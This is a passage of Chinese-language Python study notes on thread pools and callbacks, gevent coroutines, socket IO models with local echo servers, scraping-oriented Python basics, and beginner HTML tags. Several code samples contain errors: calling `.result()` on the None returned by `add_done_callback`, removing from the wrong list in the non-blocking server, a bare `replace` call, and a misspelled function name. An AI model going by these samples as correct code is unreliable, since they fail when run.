    异步:提交任务之后不等待任务的返回结果 执行继续往下执行
        返回结果如何获取？？？
        异步提交任务的返回结果 应该通过回调机制来获取
        回调机制
            就相当于给每个异步任务绑定了一个定时炸弹
            一旦该任务有结果立刻触发爆炸
"""
## 第一种：变运行任务，变打印结果
if __name__ == '__main__':
    # pool.submit(task, 1)  # 朝池子中提交任务  异步提交
    # print('主')
    t_list = []
    for i in range(20):  # 朝池子中提交20个任务
        # res = pool.submit(task, i)  # <Future at 0x100f97b38 state=running>
        res = pool.submit(task, i).add_done_callback(call_back)
        print(res.result())  # result方法   同步提交
       t_list.append(res)
    for t in t_list:
       print('>>>:',t.result())  # 肯定是有序的
"""
程序有并发变成了串行
任务的为什么打印的是None：因为函数没有指定返回值
res.result() 拿到的就是异步提交的任务的返回结果
"""

## 第二种： 等待线程池中或进程池中所有的任务执行完毕之后再继续往下执行
if __name__ == '__main__':
    t_list = []
    for i in range(20):  # 朝池子中提交20个任务
        # res = pool.submit(task, i)  # <Future at 0x100f97b38 state=running>
        res = pool.submit(task, i).add_done_callback(call_back)
    # 等待线程池中所有的任务执行完毕之后再继续往下执行
 	pool.shutdown()  # 关闭线程池  等待线程池中所有的任务运行完毕
    for t in t_list:
       print('>>>:',t.result())  # 肯定是有序的
    
    ## 结果就是先运行完所有的任务，然后一起打印结果
```

### 11.18.2 总结

```python
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
pool = ProcessPoolExecutor(5)
pool.submit(task, i).add_done_callback(call_back)
```



## 11.18 协程

```Python
"""
进程:资源单位
线程:执行单位
协程:这个概念完全是程序员自己意淫出来的 根本不存在
		单线程下实现并发
		我们程序员自己再代码层面上检测我们所有的IO操作
		一旦遇到IO了 我们在代码级别完成切换
		这样给CPU的感觉是你这个程序一直在运行 没有IO
		从而提升程序的运行效率
	
多道技术
	切换+保存状态
	CPU两种切换
		1.程序遇到IO
		2.程序长时间占用

TCP服务端 
	accept
	recv
	
代码如何做到
	切换+保存状态

切换
	切换不一定是提升效率 也有可能是降低效率
	IO切			提升
	没有IO切 降低
		
保存状态
	保存上一次我执行的状态 下一次来接着上一次的操作继续往后执行
	yield
"""
```

### 11.18.1 验证切换是否就一定提升效率

```python
import time

# # 串行执行计算密集型的任务   1.2372429370880127
def func1():
    for i in range(10000000):
        i + 1

def func2():
    for i in range(10000000):
        i + 1

start_time = time.time()
func1()
func2()
print(time.time() - start_time)

# 切换 + yield  2.1247239112854004
import time

def func1():
    while True:
         10000000 + 1
         yield


def func2():
    g = func1()  # 先初始化出生成器
    for i in range(10000000):
       i + 1
       next(g)

start_time = time.time()
func2()
print(time.time() - start_time)
```

### 11.18.2 gevent模块(了解)

```python
pip3 install gevent
```

```python
from gevent import monkey;monkey.patch_all()
import time
from gevent import spawn

"""
gevent模块本身无法检测常见的一些io操作
在使用的时候需要你额外的导入一句话
from gevent import monkey
monkey.patch_all()
又由于上面的两句话在使用gevent模块的时候是肯定要导入的
所以还支持简写
from gevent import monkey;monkey.patch_all()
"""

def heng():
    print('哼')
    time.sleep(2)
    print('哼')


def ha():
    print('哈')
    time.sleep(3)
    print('哈')

def heiheihei():
    print('heiheihei')
    time.sleep(5)
    print('heiheihei')


start_time = time.time()
g1 = spawn(heng)
g2 = spawn(ha)
g3 = spawn(heiheihei)
g1.join()
g2.join()  # 等待被检测的任务执行完毕 再往后继续执行
g3.join()
# heng()
# ha()
# print(time.time() - start_time)  # 5.005702018737793
print(time.time() - start_time)  # 3.004199981689453   5.005439043045044
```

### 11.18.3 协程实现TCP服务端的并发

```python
# 服务端
from gevent import monkey;monkey.patch_all()
import socket
from gevent import spawn


def communication(conn):
    while True:
        try:
            data = conn.recv(1024)
            if len(data) == 0: break
            conn.send(data.upper())
        except ConnectionResetError as e:
            print(e)
            break
    conn.close()


def server(ip, port):
    server = socket.socket()
    server.bind((ip, port))
    server.listen(5)
    while True:
        conn, addr = server.accept()
        spawn(communication, conn)


if __name__ == '__main__':
    g1 = spawn(server, '127.0.0.1', 8080)
    g1.join()

    
# 客户端
from threading import Thread, current_thread
import socket


def x_client():
    client = socket.socket()
    client.connect(('127.0.0.1',8080))
    n = 0
    while True:
        msg = '%s say hello %s'%(current_thread().name,n)
        n += 1
        client.send(msg.encode('utf-8'))
        data = client.recv(1024)
        print(data.decode('utf-8'))


if __name__ == '__main__':
    for i in range(500):
        t = Thread(target=x_client)
        t.start()
```

### 11.18.4 总结

```python
"""
理想状态:
	我们可以通过
	多进程下面开设多线程
	多线程下面再开设协程序
	从而使我们的程序执行效率提升
"""
```

## 11.19 IO模型

### 11.19.1 IO模型简介

```python
"""
我们这里研究的IO模型都是针对网络IO的
Stevens在文章中一共比较了五种IO Model：
    * blocking IO           阻塞IO
    * nonblocking IO      非阻塞IO
    * IO multiplexing      IO多路复用
    * signal driven IO     信号驱动IO
    * asynchronous IO    异步IO
    由signal driven IO（信号驱动IO）在实际中并不常用，所以主要介绍其余四种IO Model。
"""
#1）等待数据准备 (Waiting for the data to be ready)
#2）将数据从内核拷贝到进程中(Copying the data from the kernel to the process)

## 同步异步
## 阻塞非阻塞
## 常见的网络阻塞状态:
  	accept
    recv
    recvfrom
    
    ## send虽然它也有io行为 但是不在我们的考虑范围
```

### 11.19.2 阻塞IO模型

```python
"""
我们之前写的都是阻塞IO模型  协程除外
"""
import socket


server = socket.socket()
server.bind(('127.0.0.1',8080))
server.listen(5)


while True:
    conn, addr = server.accept()
    while True:
        try:
            data = conn.recv(1024)
            if len(data) == 0:break
            print(data)
            conn.send(data.upper())
        except ConnectionResetError as e:
            break
    conn.close()
    
# 在服务端开设多进程或者多线程 进程池线程池 其实还是没有解决IO问题	
## 该等的地方还是得等 没有规避
## 只不过多个人等待的彼此互不干扰
```

### 11.19.3 非阻塞IO

```python
"""
要自己实现一个非阻塞IO模型
"""
import socket
import time


server = socket.socket()
server.bind(('127.0.0.1', 8081))
server.listen(5)
# 将所有的网络阻塞变为非阻塞
server.setblocking(False)
r_list = []
del_list = []
while True:
    try:
        conn, addr = server.accept()
        r_list.append(conn)
    except BlockingIOError:
        # time.sleep(0.1)
        # print('列表的长度:',len(r_list))
        # print('做其他事')
        for conn in r_list:
            try:
                data = conn.recv(1024)  # 没有消息 报错
                if len(data) == 0:  # 客户端断开链接
                    conn.close()  # 关闭conn
                    # 将无用的conn从r_list删除
                    del_list.remove(conn)
                    continue
                conn.send(data.upper())
            except BlockingIOError:
                continue
            except ConnectionResetError:
                conn.close()
                del_list.append(conn)
        # 挥手无用的链接
        for conn in del_list:
            r_list.remove(conn)
        del_list.clear()

# 客户端
import socket


client = socket.socket()
client.connect(('127.0.0.1',8081))


while True:
    client.send(b'hello world')
    data = client.recv(1024)
    print(data)
```

### 11.19.4 总结

```python
"""
虽然非阻塞IO给你的感觉非常的牛逼
但是该模型会	长时间占用着CPU并且不干活 让CPU不停的空转
我们实际应用中也不会考虑使用非阻塞IO模型

任何的技术点都有它存在的意义 
实际应用或者是思想借鉴
"""
```

### 11.19.5 IO多路复用

```python
"""
当监管的对象只有一个的时候 其实IO多路复用连阻塞IO都比比不上！！！
但是IO多路复用可以一次性监管很多个对象

server = socket.socket()
conn,addr = server.accept()

监管机制是操作系统本身就有的 如果你想要用该监管机制(select)
需要你导入对应的select模块
"""
import socket
import select


server = socket.socket()
server.bind(('127.0.0.1',8080))
server.listen(5)
server.setblocking(False)
read_list = [server]


while True:
    r_list, w_list, x_list = select.select(read_list, [], [])
    """
    帮你监管
    一旦有人来了 立刻给你返回对应的监管对象
    """
    # print(res)  # ([<socket.socket fd=3, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 8080)>], [], [])
    # print(server)
    # print(r_list)
    for i in r_list:  #
        """针对不同的对象做不同的处理"""
        if i is server:
            conn, addr = i.accept()
            # 也应该添加到监管的队列中
            read_list.append(conn)
        else:
            res = i.recv(1024)
            if len(res) == 0:
                i.close()
                # 将无效的监管对象 移除
                read_list.remove(i)
                continue
            print(res)
            i.send(b'heiheiheiheihei')

 # 客户端
import socket


client = socket.socket()
client.connect(('127.0.0.1',8080))


while True:

    client.send(b'hello world')
    data = client.recv(1024)
    print(data)
```

### 11.19.6 总结

```python
"""
监管机制其实有很多
select机制  windows linux都有

poll机制    只在linux有   poll和select都可以监管多个对象 但是poll监管的数量更多

上述select和poll机制其实都不是很完美 当监管的对象特别多的时候
可能会出现 极其大的延时响应

epoll机制   只在linux有
	它给每一个监管对象都绑定一个回调机制
	一旦有响应 回调机制立刻发起提醒

针对不同的操作系统还需要考虑不同检测机制 书写代码太多繁琐
有一个人能够根据你跑的平台的不同自动帮你选择对应的监管机制
selectors模块
"""
```

### 11.19.7 异步IO

```python
"""
异步IO模型是所有模型中效率最高的 也是使用最广泛的
相关的模块和框架
	模块:asyncio模块
	异步框架:sanic tronado twisted
		速度快！！！
"""
import threading
import asyncio


@asyncio.coroutine
def hello():
    print('hello world %s'%threading.current_thread())
    yield from asyncio.sleep(1)  # 换成真正的IO操作
    print('hello world %s' % threading.current_thread())


loop = asyncio.get_event_loop()
tasks = [hello(),hello()]
loop.run_until_complete(asyncio.wait(tasks))
loop.close()
```

# 八，爬虫所需Python基础

**（以下内容是学Python爬虫必掌握内容）**

## 1 ，基础语法相关

### 1-1  if条件判断

```python
if 条件:
    # 事情1
else:
    # 事情2
```

上面就是if的最基础的语法规则. 含义是, 如果条件为真, 去执行`事情1`, 如果条件不真, 去执行`事情2`. 这东西. 我就不拆开聊了. 关于if. 你要记住的事情是, `它是用来做条件判断的`. 以后你的程序里,  如果需要条件判断了. 就用它....

举例,

在写爬虫的时候. 我们会遇到这样的两种情况 

情况一, 数据里有一些我们并不需要的内容

```python
data = "10,英雄本色,1500万"   # 正常你需要的数据
data = "11,-,-"  # 你不需要的数据

# 伪代码, 理解含义(思路)
if data里有你不需要的数据:
	再见
else:
 	保留

```

情况二, 页面结构不统一, 会有两种页面结构

```python
# 伪代码, 理解含义(思路)
提取器1 = xxxx  #  用来提取页面中内容的
提取器2 = xxxxxx

# 页面有可能是不规则的。 张飞， 潘长江 
结果1 = 提取器1.提取(页面)
if 结果1:
    有结果. 存起来
else:
    没有结果. 
    结果2 = 提取器2.提取(页面)
```

相信我, 上面的逻辑并不难. 但是, 到了后面很多小伙伴容易踩坑. 我们完全没必要用一个提取器获取所有的数据. 完全没必要.....

### 1-2 while循环

关于循环, 我们必须要知道一个事情. 

```python
while 条件:
    循环体
```

如果条件为真, 就执行循环体, 然后再次判断条件.....直到条件为假. 结束循环. 

反复的执行一段代码

**关于True和False**

```Python
True, ## 是真的意思. 翻译成人话:  对的, OK, 没毛病. 确定
False, ## 是假的意思. 翻译成人话: 不对劲, 错误, No. 有瑕疵. 不对劲

这个应该都能看懂. 
```

但是下面这个, 需要各位去记住

```python
# 几乎所有能表示为空的东西. 都可以认为是False
print(bool(0))
print(bool(""))
print(bool([]))
print(bool({}))
print(bool(set()))
print(bool(tuple()))
print(bool(None))
# 上面这一坨全是False, 相反的. 都是真. 利用这个特性. 我们可以有以下的一些写法

# 伪代码, 理解逻辑. 
结果 = 提取器.提取(页面)
if 结果:
    有结果. 我要保存结果
else:
    没结果. ......
```

## 2，字符串  

**(万恶之源, 必须要会的, 而且要熟..)**

​	字符串在`爬虫`里. 必须要知道的几个操作:

### 2-1 索引和切片

索引, 就是第几个字符. 它从0开始. 
切片, 从字符串中提取n个字符. 

```python
s = "我爱黎明,黎明爱我"
print(s[1])
print(s[0])

print(s[2:4])  从第2个, 到第4个(取不到4)
```

### 2-2 strip()

我们从网页上提取的数据. 很多都是带有一些杂质的(换行, 空格),怎么去掉?

strip()可以去掉字符串`左右两端`的空白(空格, 换行\n, 回车\r, 制表符\t)

```python
s = "    \t\t\t我的天哪\r\r      \n\n  "  # 够乱的字符串
s1 = s.strip()
print(s1)  # 好了 `我的天哪`
```

### 2-3 split()

split,  做切割的. 

```python
s = "10,男人本色,100000万"  # 你在网页上提取到这样的一段数据. 现在我需要电影名称
tmps = s.split(",")
name = tmps[1]
print(name)  # 男人本色

id, name, money = s.split(",")  # 切割后. 把三个结果直接怼给三个变量
print(id)
print(name)
print(money)
```

### 2-4 replace()

replace, 字符串替换

```python
s = "我      \t\t\n\n爱   黎       明    "   # 这是你从网页上拿到的东西
s1 = replace(" ", "").replace("\t", "").replace("\n", "")  # 干掉空格, \t, \n
print(s1)  # 我爱黎明
```



### 2-5 join()

join, 将列表拼接为一个完整的字符串

```python
lst = ["我妈", "不喜欢", "黎明"]  # 有时,由于网页结构的不规则, 导致获取的数据是这样的. 
s1 = "".join(lst)  # 用空字符串把lst中的每一项拼接起来
print(s1)  # 我妈不喜欢黎明

lst2 = ["\n\r","\n\r","周杰伦\n\r", "\n不认识我\r"] 
s2 = "".join(lst2).replace("\n", "").replace("\r", "")
print(s2)  # 周杰伦不认识我

```

### 2-6 f-string

格式化字符串的一种方案

```python
s = "周杰伦"
s1 = f"我喜欢{s}"  #  它会把一个变量塞入一个字符串
print(s1)  # 我喜欢周杰伦

k = 10085
s2 = f"我的电话号是{k+1}" # 它会把计算结果赛入一个字符串
print(s2)  # 我的电话号是10086

# 综上, f-string的大括号里, 其实是一段表达式.能计算出结果即可

```



## 3， 列表

列表, 我们未来遇见的仅次于字符串的一种数据类型. 它主要是能承载大量的数据. 理论上. 你的内存不炸. 它就能一直存

### 3-1 索引, 切片

列表的索引和切片逻辑与字符串完全一致

```python
lst = ["赵本山", "王大陆", "大嘴猴", "马后炮"]
item1 = lst[2]  # 大嘴猴
item2 = lst[1]  # 王大陆

lst2 = lst[2:]
print(lst2)  # ["大嘴猴", "马后炮"]

# 注意, 如果列表中没有数据. 取0会报错
lst = []
print(lst[0])  # 报错, Index out of bounds

# 注意, 如果给出的索引下标超过了列表的最大索引. 依然会报错
lst = ["123", "456"]
print(lst[9999])  # 报错, Index out of bounds

```



### 3-2 增加

给列表添加数据. 

```python
lst = [11,22]
lst.append(33)
lst.append(44)
print(lst)  # [11,22,33,44]
```

### 3-3 删除

删除数据(不常用, 好不容易爬到的数据. 为什么要删)

```python
lst.remove("周润发")  #  把周润发删掉
```

### 3-4 修改

```python
lst = ["赵本山", "王大陆", "大嘴猴", "马后炮"]
lst[1] = "周杰伦"
print(lst)  # ["赵本山", "周杰伦", "大嘴猴", "马后炮"]
```

### 3-5 range

用for循环数数的一个东西

```python
for i in range(10):
    print(i)   # 从0数到9
   
for i in range(5, 10):
    print(i)  # 从5 数到 9
```

### 3-6 查询(必会!!!!)

```python
lst = ["赵本山", "周杰伦", "大嘴猴", "马后炮"]
print(lst[0])
print(lst[1])
print(lst[2])
print(lst[3])

# 循环列表的索引
for i in range(len(lst)):
    print(lst[i])
# 循环列表的内容
for item in lst:
    print(item)
    
# enumerate
lst = [11, 22, 33, 44, 55]
# 得到的是一个元组. (index, item)
for i, item in enumerate(lst):
    print(i, item)

```



## 4，  字典

字典可以成对儿的保存数据. 

### 4-1 增加

```python
dic = {}
dic['name'] = '樵夫'
dic['age'] = 18

print(dic)  # {"name": "樵夫", "age": 18}
```



### 4-2 修改

```python
dic = {"name": "樵夫", "age": 18}
dic['age'] = 19
print(dic)  # {"name": "樵夫", "age": 19}
```



### 4-3 删除(不常用)

```python
dic = {"name": "樵夫", "age": 18}
dic.pop("age")
print(dic)  # {'name': '樵夫'}
```



### 4-4 查询(重点)

```python
dic = {"name": "樵夫", "age": 18}

a = dic['name']  # 查询'name'的值
print(a)  # 樵夫

b = dic['age']  # 拿到dic中age对应的值
print(b)  # 18

c = dic['哈拉少']   # 没有哈拉少. 报错
d = dic.get("哈拉少")  # 没有哈拉少, 不报错. 返回None. 它好. 它不报错

```

#### 4-4-1 循环

```python
dic = {"name": "樵夫", "age": 18}
for k in dic:  # 循环出所有的key
    print(k)  
    print(dic[k])  # 获取到所有的value并打印
    
```

#### 4-4-2 嵌套

```python
dic = {
    "name": "王峰",
    "age": 18,
    "wife": {
        "name": "章子怡",
        "age": 19,
    },
    "children": [
        {'name':"胡一菲", "age": 19},
        {'name':"胡二菲", "age": 18},
        {'name':"胡三菲", "age": 17},
    ]
}

# 王峰的第二个孩子的名字
print(dic['children'][1]['name'])
# 王峰所有孩子的名称和年龄
for item in dic['children']:
    print(item['name'])
    print(item['age'])
```





## 5，  字符集和bytes

字符集, 记住两个字符集就够了. 一个是utf-8, 一个是gbk. 都是支持中文的. 但是utf-8的编码数量远大于gbk. 我们平时使用的最多的是utf-8

```python
# 把字符串转化成字节
bs = "我的天哪abcdef".encode("utf-8")
print(bs)  #  b'\xe6\x88\x91\xe7\x9a\x84\xe5\xa4\xa9\xe5\x93\xaaabcdef'
# 一个中文在utf-8里是3个字节. 一个英文是一个字节. 所以英文字母是正常显示的

# 把字节还原回字符串
bs = b'\xe6\x88\x91\xe7\x9a\x84\xe5\xa4\xa9\xe5\x93\xaaabcdef'
s = bs.decode("utf-8")
print(s)

```

记住, bytes不是给人看的. 是给机器看的. 我们遇到的所有文字, 图片, 音频, 视频. 所有所有的东西到了计算机里都是字节. 



## 6，文件操作

python中. 想要处理一个文件. 必须用open()先打开一个文件

语法规则

```python
f = open(文件名, mode="模式", encoding='文件编码')
f.read()|f.write()
f.close()

```

文件名就不解释了. 

模式: 
	我们需要知道的主要有4个. 分别是: r, w, a, b

```python
1. r  ## 只读模式. 含义是, 当前这一次open的目的是读取数据. 所以, 只能读. 不能写
2. w ## 只写模式. 含义是, 当前这一次open的目的是写入数据. 所以, 只能写, 不能读
3. a ## 追加模式. 含义是, 当前这一次open的目的是向后追加. 所以, 只能写, 不能读
4. b ## 字节模式. 可以和上面三种模式进行混合搭配. 目的是. 写入的内容或读取的内容是字节. 
```

问: 

1. 如果我想保存一张图片. 应该用哪种模式?
2. 我想读取txt文件, 用哪种模式?
3. 我想复制一个文件. 应该用哪种模式?

encoding: 文件编码. 只有处理的文件是文本的时候才能使用. 并且mode不可以是`b`.   99%的时候我们用的是`utf-8`

另一种写法:

```python
with open(文件名, mode=模式, encoding=编码) as f:
    pass
```

这种写法的好处是, 不需要我们手动去关闭`f`

读取一个文本文件:

```python
with open("躺尸一摆手.txt", mode="r", encoding="utf-8") as f:
    for line in f:  # for循环可以逐行的进行循环文件中的内容
        print(line)
```



## 7，关于函数

在代码量很少的时候, 我们并不需要函数. 但是一旦代码量大了. 一次写个几百行代码. 调试起来就很困难. 此时, 建议把程序改写成一个一个具有特定功能的函数. 方便调试. 也方便代码的重用

```python
def 函数名(形式参数):
    # 函数体
    return 返回值
```

上面是编写一个函数的固定逻辑. 但是, 编写好的函数是不会自己运行的. 必须有人调用才可以

```python
函数名(实际参数)
```

写一个试试:

```python
def get_page_source(url):
    print("我要发送请求了. 我要获取到页面源代码啊")
    return "页面源代码"

pg_one = get_page_source("baidu.com")
pg_two = get_page_source("koukou.com")
```

再来一个

```python
def download_image(url, save_path):
    print(f"我要下载图片{url}了", f"保存在{save_path}")

donwload_image("http://www.baidu.com/abc/huyifei.jpg", "胡二飞.jpg")
donwload_image("http://www.baidu.com/aaa/dagedagefeifeifei.jpg", "大哥大哥飞飞飞.jpg")

```

总结, 函数的好处就是, 以后需要该功能. 不用再写重复代码了. 



## 8， 关于模块

模块是啥? 模块就是已经有人帮我们写好了的一些代码, 这些代码被保存在一个py文件或者一个文件夹里. 我们可以拿来直接用

在python中有三种模块.

```Python
第一种, python内置模块
​	## 不用安装. 直接导入就能用

第二种, 第三方模块
​	## 需要安装. 安装后. 导入就可以用了

第三种, 自定义模块(新手先别自己定义模块)
​	## 直接导入就能用
```

导入模块的语法

```python
import 模块
from 模块 import 功能
from 模块.子模块 import 功能

举例子, 
import os
import sys
from urllib.parse import urljoin
from bs4 import BeautifulSoup
```

搞爬虫.必须要了解的一些python内置模块

### 8-1 time模块

```python
import time
time.time()  # 这个是获取到时间戳
time.sleep(999)  # 让程序暂停999秒
```



### 8-2 os模块

```python
import os
# 判断文件是否存在
os.path.exists()  #  判断文件或者文件夹是否存在
os.path.join()    # 路径拼接
os.makedirs()     # 创建文件夹

```



### 8-3 son模块(重中之重)

现在的网站不同于从前了. 习惯性用json来传递数据. 所以, 我们必须要知道json是啥, 以及python如何处理json. 

json是一种类似字典一样的东西.  对于python而言, json是字符串. 



例如, 

```python
s = '{"name": "jay", "age": 18}'
```

你看. 这破玩意就是`json`

如何来转化它. 

**<span style="background-color:yellow;color:red;">json字符串 => python字典</span>**

```python
import json
s = '{"name": "jay", "age": 18}'
dic = json.loads(s)
print(type(dic))
```

**<span style="background-color:yellow;color:red;">python字典 => json字符串</span>**

```python
import json
dic = {"name": "jay", "age": 18}
s = json.dumps(dic)
print(type(s))
```



### 8-4 random模块

随机. 没别的用处.生成随机数

```python
import random
i = random.randint(1, 10)  # 1~10的随机数
print(i)   # 多跑两次.效果更加
```



### 8-5 异常处理

这个是重点. 我们在写爬虫的时候. 非常容易遇到问题. 但这些问题本身并不是我们程序的问题. 

比如, 你在抓取某网站的时候. 由于网络波动或者他服务器本身压力太大. 导致本次请求失败. 这种现象太常见了. 此时, 我们程序这边就会崩溃. 打印一堆红色的文字. 让你难受的一P.  怎么办?

我们要清楚一个事情. 我们平时在打开一个网址的时候. 如果长时间没有反应, 或者加载很慢的时候. 我们习惯性的会刷新网页. 对吧. 这个逻辑就像: `程序如果本次请求失败了. 能不能重新来一次`. OK, 我们接下来聊的这个异常处理. 就是干这个事儿的. 

```python
try: # 尝试...
    print("假如, 我是一段爬虫代码, 请求到对方服务器")
    print("我得出事儿啊")
    print(1/0)  # 出事儿了
except Exception as e:  # 出错了. 我给你兜着
    print(e)  # 怎么兜?  打印一下. 就过去了
    
print("不论上面是否出错. 我这里, 依然可以执行")
```

看懂了么? 程序执行的时候. 如果`try`中的代码出现错误. 则自动跳到`except`中. 并执行`except`中的代码. 然后程序正常的, 继续执行

有了这玩意. 我们就可以写出一段很漂亮的代码逻辑:

```python
while 1:
    try:
        我要发送请求了. 我要干美国CIA的总部. 我要上天
        print("我成功了!!")
        break  # 成功了.就跳出循环
    except Exception as e:
        print("失败了")
        print("我不怕失败")
        print("再来")
       
```

改良版:

```python
import time
for i in range(10):
    try:
        我要发送请求了. 我要干美国CIA的总部. 我要上天
        print("我成功了!!")
        break  # 成功了.就跳出循环
    except Exception as e:
        print("失败了")
        print("我不怕失败")
        print("再来")
        time.sleep(i * 10)
       
```

# 九，HTML+CSS基础

## 1，HTML

### 1-1 前言

软件架构

```python
B/S

​	Browser/Server   网站

C/S

​	Client/Server	       QQ
```

HTML的简介、发展史：

```python
## 万维网联盟（W3C）维护。包含HTML内容的文件最常用的扩展名是.html，但是像DOS这样的旧操作系统限制扩展名为最多3个字符，所以.htm扩展名也被使用。虽然现在使用的比较少一些了，但是.htm扩展名仍旧普遍被支持。
```

网站：

```python
把所有的网站资源文件（HTML,CSS,JS,图片,视频等）整合到一起(的一个文件夹)
WEB前端：## HTML+CSS+JavaScript
HTML：## 结构标准，超文本标记语言，负责通过标签来表达网页的页面结构。
css：## 外观标准，层叠样式表标记语言，负责通过属性标记来表达网页的外观效果。
```

**重点：**

*我们学习HTML与CSS不是为了写样式，而是了解HTML标签的结构，CSS中的选择器也就是长什么样子即可，为了后面的正则、xpath与bs4做铺垫准备*

### 1-2 什么是HTML？

超文本标记语言

​	(1) 标签 也叫做 标记

​	(2) html是由标签/标记 和内容组成的

​	(3) 标签 是由 标签名称 和属性组成的

实例：

> <人 肤色=“黄色” 眼镜="很大"></人>

扩展：

使用协议为  http超文本传输协议

普通文本：文字内容

超文本：视频、音频、图片、文字...

### 1-3 HTML的主体标签

实例

```html
<!DOCTYPE html>  #H5的头   声明文档类型 为html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/TDT/xhtml1-strit.dtd">  之前的头文件 现在不用
<html>
<head>
	<title>标题内容</title>
  	<meta charset="UTF-8"> #设置字符集
</head>
<body>
  	放html的主体标签
</body>
</html>
```

```python
- html: ## 文件是网页，浏览器加载网页，就可以浏览 
- head: ## 头部分，网页总体信息 
  + title:## 网页标题
  + meta：## 网页主体信息，会根据name(author/description/keywords)
  + link:## 引入外部文件
  + style：## 写入CSS
  + script：##写入JS
- body:## 身体部分，网页内容
```

### 1-4 HTML的标签

标签分为：单标签/单标记 

如：\<br /> /\<br >  

双标签/双标记  

如: \<p>\</p>

#### 1-4-1 文本标签

1. `<div></div>`  块标签  作用是设定字、画、表格等的摆放位置

2. `<p></p>   `段落标签  自成一段  会将上下的文字 和它保持一定的距离
3. `<h1>-</h6> `标题标签 字体加粗 自占一行

```HTML
<!doctype html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Document</title>
</head>
<body>
<!--文本标签-->
双标签/双标记 成对出现的
<!--<div>双标签</div>-->
<p>段落 我会自成一段</p>
<p>段落 我会自成一段</p>
<p>段落 我会自成一段</p>
<p>段落 我会自成一段</p>
<h1>h1标题标签</h1>
<h2>h1标题标签</h2>
<h3>h1标题标签</h3>
<h4>h1标题标签</h4>
<h5>h1标题标签</h5>
<h6>h1标题标签</h6>
<!--<h7>h1标题标签</h7>-->
</body>
</html>
```

#### 1-4-2  图片标签

`<img />` 在网页中插入一张图片

属性：

```python
 src： ## 图片名及url地址 (必须属性)
 alt: ## 图片加载失败时的提示信息
 title：## 文字提示属性
 width：## 图片宽度
 height：## 图片高度
```



实例:

```html
<img src="图片地址" title="文字提示" alt="图片加载失败显示得信息" width="宽" height="高" border="边框" />
```

![image-20240130132136247](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240130132136247.png)

如果宽和高 只给一个 那么为等比缩放  如果俩个都给 那么会按照 你所给的宽和高来显示

#### 1-4-3 路径

```python
1. 相对路径
    ./	## 当前
    ../    ##  上一级
2. 绝对路径(了解)
    ##一个固定得链接地址(如域名)
    ##从根磁盘 一直到你的文件得路径
```


#### 1-4-4  超链接

\<a href="链接地址" title="提示信息" target="打开方式">点击显示得内容\</a>

属性：

href必须，指的是链接跳转地址

target: 

```python
	   _blank ## 新建窗口得形式来打开

​	   _self      ## 本窗口来打开(默认)
```

title：文字提示属性（详情）

```HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<!--<a href="http://www.baidu.com">去百度</a>-->
<a href="http://www.baidu.com" target="_blank">去百度</a>
</body>
</html>
```

![image-20240130132151618](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240130132151618.png)

#### 1-4-5  列表

1. ##### 无序列表

   ```html
   <ul>
   	<li></li>  
   </ul>
   ```

2. ##### 有序列表

   ```html
   <ol>
    	<li></li>
   </ol>
   ```

3. ##### 自定义列表

   ```html
   <dl>
     	<dt>列表头</dt>
     	<dd>列表内容</dd>
   </dl>
   ```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<ul>
  <li>当前标签要认识熟</li>
  <li>当前标签要认识熟</li>
  <li>当前标签要认识熟</li>
  <li>当前标签要认识熟</li>
</ul>
<ol>
  <li>当前标签要认识熟</li>
  <li>当前标签要认识熟</li>
  <li>当前标签要认识熟</li>
  <li>当前标签要认识熟</li>
</ol>
<dl>
    <dt>列表头</dt>
    <dd>列表项</dd>
    <dd>列表项</dd>
    <dd>列表项</dd>
    <dd>列表项</dd>
    <dt>列表头</dt>
    <dd>列表项</dd>
    <dd>列表项</dd>
    <dd>列表项</dd>
    <dd>列表项</dd>
</dl>
<!--注释-->
</body>
</html>
```

![image-20240130132210941](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240130132210941.png)

#### 1-4-5  HTML注释

多行注释：<!--注释的内容-->

注释的作用：

1. 代码的调试
2. 解释说明

### 1-5  iframe

#### 1-5-1 定义和用法

iframe 元素会创建包含另外一个文档的内联框架（即行内框架）。

#### 1-5-2 使用

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
</head>
<body>

<iframe src="http://mediaplay.kksmg.com/2022/07/25/h264_720p_600k_39038-DFTVHD-20220725175000-4800-310117-600k_mp4.mp4"></iframe>

<p>一些老的浏览器不支持 iframe。</p>
<p>如果得不到支持，iframe 是不可见的。</p>

</body>
</html>
```

![image-20240130132245541](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240130132245541.png)

   ### 1-6  TABLE表格

table表格

#### 1-6-1 属性：

```python
+ width ## 宽
+ height##  高
+ border ## 边框
```

#### 1-6-2 标签：

```python
tr	## 行标签
th  ##列头标签
td  ## 列标签
```

实例：

```html
<table>
  <tr>
    <th>我是表头</th>
    <th>我是表头</th>
    <th>我是表头</th>
  </tr>
  <tr>
    <td>我是单元格</td>
    <td>我是单元格</td>
    <td>我是单元格</td>
  </tr>
</table>
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<table border="1" width="700">
  <tr>
    <td>姓名</td>
    <td>年龄</td>
    <td>身高</td>
    <td>爱好</td>
  </tr>
  <tr>
    <td>lucky</td>
    <td>18</td>
    <td>189</td>
    <td>看美女</td>
  </tr>
  <tr>
    <td>lucky</td>
    <td>18</td>
    <td>189</td>
    <td>看美女</td>
  </tr>
  <tr>
    <td>lucky</td>
    <td>18</td>
    <td>189</td>
    <td>看美女</td>
  </tr>
  <tr>
    <td>lucky</td>
    <td>18</td>
    <td>189</td>
    <td>看美女</td>
  </tr>
  <tr>
    <td>lucky</td>
    <td>18</td>
    <td>189</td>
    <td>看美女</td>
  </tr>
</table>
</body>
</html>
```

